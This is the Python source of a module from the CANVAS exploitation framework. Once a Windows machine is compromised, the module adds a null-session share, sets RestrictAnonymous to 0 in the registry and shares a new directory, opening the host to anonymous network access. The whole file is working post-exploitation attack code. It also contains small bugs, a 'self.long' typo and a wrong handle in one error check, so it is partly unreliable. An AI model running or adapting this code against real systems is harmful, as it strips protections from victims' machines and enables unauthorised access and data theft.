#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2008
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path:
    sys.path.append('.')

from exploitutils import *
from canvasexploit import canvasexploit
from ExploitTypes.localcommand import LocalCommand
from ExploitTypes.windowsLocalExploit import WindowsLocalExploit

NAME                = "addnullshare"
DESCRIPTION         = "adds a null share on the local or remote machine"
DOCUMENTATION       = {}
VERSION             = "1.0"

PROPERTY            = {}
PROPERTY['TYPE']    = "Commands"
PROPERTY['SITE']    = "Local"
PROPERTY['ARCH']    = [ ["Windows"] ]


class theexploit(LocalCommand, WindowsLocalExploit):
    def __init__(self):
        LocalCommand.__init__(self)
        WindowsLocalExploit.__init__(self)

        self.result     = ""
        self.name       = NAME
        self.share      = "TMP"
        self.netname    = "\\\\127.0.0.1" #no \\ on the end!!!

    def getargs(self):
        self.share      = self.argsDict.get("share", self.share)
        self.netname    = self.argsDict.get("netname", self.netname)

    def run(self):
        self.setInfo("%s"%(NAME))
        
        self.node   = self.argsDict["passednodes"][0]
        ret         = 0

        if "win32api" in self.node.capabilities:

            shell   = self.node.shell
            hKey    = shell.RegOpenKeyEx("HKEY_LOCAL_MACHINE",
                                      "SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters",
                                      "KEY_ALL_ACCESS")

            self.log("Opened key: %s"%hKey)
            if hKey == 0:
                self.log("Failed to open registry key")
                return 0
            
            ret,datatype,buffer = shell.RegQueryValueEx(hKey, "NullSessionShares")
            if ret == 0:
                #self.log("Could not RegQueryValueEx")
                #ret = shell.RegCloseKey(hKey)
                buffer = self.share+"\x00\x00"
            else:
                buffer = buffer[:-1]+self.share+"\x00\x00" #trim a null off it and add it to the end


            self.log("Completed RegQueryValueEx")
            
            self.log("Trying to set registry key to %s" % prettyprint(buffer))
            
            ret,errorcode = shell.RegSetValueEx(hKey, "NullSessionShares", "REG_MULTI_SZ", buffer)
            if ret == 0:
                self.log("Could not RegSetValueEx: error %s!" % errorcode)
                return 0
            self.log("Set the registry value")

            hKey2 = shell.RegOpenKeyEx("HKEY_LOCAL_MACHINE", 
                                "SYSTEM\\CurrentControlSet\\Control\\LSA",
                                "KEY_ALL_ACCESS")

            self.log("Opened key: %s"% hKey2)
            if hKey == 0:
                self.log("Failed to open LSA registry key")
                return 0

            ret, errorcode = shell.RegSetValueEx(hKey2, "RestrictAnonymous", "REG_DWORD", 0)
            if ret == 0:
                self.long("Could not RegSetValueEx: error %s!" % errorcode)
                return 0
            self.log("Set the registry value")


            drive       = chr(shell.GetDrive()+ord("A")-1)+":"
            drivepath   = drive+"\\"+self.share
            
            self.log("Creating directory: %s" % drivepath)

            ret = shell.mkdir(drivepath)
            if ret != 0:
                self.log("Could not create %s for some reason?" % drivepath)
                
            ret,err = shell.NetShareAdd(self.netname,self.share,drivepath)
            if ret == 0:
                self.log("NetShareAdd returned error: %s"%err)
            ret = shell.RegCloseKey(hKey) #done!
            ret = shell.RegCloseKey(hKey2) #done!

            self.log("Completed the net share add!")

        else:
            self.log("%s node type not supported"%self.node.nodetype)
                        
        self.result = ret
                
        self.setInfo("%s - done (success: %s)" % (NAME,self.result))
        return 1

